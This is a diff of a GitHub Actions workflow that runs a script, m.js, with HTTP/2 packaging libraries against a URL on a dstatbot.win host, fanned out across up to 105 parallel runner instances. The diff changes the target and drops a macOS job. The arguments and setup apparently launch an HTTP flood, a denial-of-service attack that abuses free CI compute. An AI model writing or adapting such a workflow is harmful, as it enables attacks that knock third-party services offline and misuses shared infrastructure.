@@ -30,36 +30,10 @@ jobs:
         run: npm install hpack.js chalk hpack
       
       - name: Run m.js
-        run: node m.js GET https://c2.dstatbot.win/wsLBXneW 300 4 100 --full --debug --cache
+        run: node m.js GET https://c4.dstatbot.win/Fa1Oyvj3 400 4 100 --full --debug --cache
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
           RUNNER_OS: ubuntu
 
-  parallel-execution-macos:
-    runs-on: macos-latest
-    strategy:
-      max-parallel: 5
-      matrix:
-        instance: [101, 102, 103, 104, 105]
-    
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-          # Remove or comment out the cache line
-          # cache: 'npm'
-      
-      - name: Install dependencies
-        run: npm install hpack.js chalk hpack
-      
-      - name: Run m.js
-        run: node m.js
-        env:
-          INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 105
-          RUNNER_OS: macos
+  
